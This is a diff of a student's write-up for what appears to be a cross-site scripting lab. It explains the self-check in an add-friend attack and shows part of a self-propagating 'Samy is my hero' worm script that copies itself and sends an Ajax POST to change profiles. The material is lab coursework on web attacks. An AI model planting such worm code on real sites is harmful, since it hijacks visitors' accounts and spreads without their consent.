@@ -75,6 +75,7 @@ When Alice is accessing Samy's web page, we can see the request is automatically
 Answer: If we do not add this check, when Samy is checking his own page, the malicious code may copy the text "Samy is my hero" to his own profile, which will overwrite the malicious content. For add_friend.js, the malicious code does not do any overwrite, it only send the get request to the server to add Samy as friend. When Samy access the server, the server would not accept a request that add himself as a friend. Therefore, adding this if statement or not will not influence the result of the attack. 
 # Task 4
 ## Results and Screenshots
+Input: 
 ```
 <script id="worm">
 var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
@@ -95,3 +96,7 @@ Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 Ajax.send(content); } 
 }
 ```
+Samy's Profile: (After put the worm)
+Alice Profile (Before put the worm):
+Alice Profile (After visit Samy's Profile):
+Boby Profile (Before visit Alice's Profile):
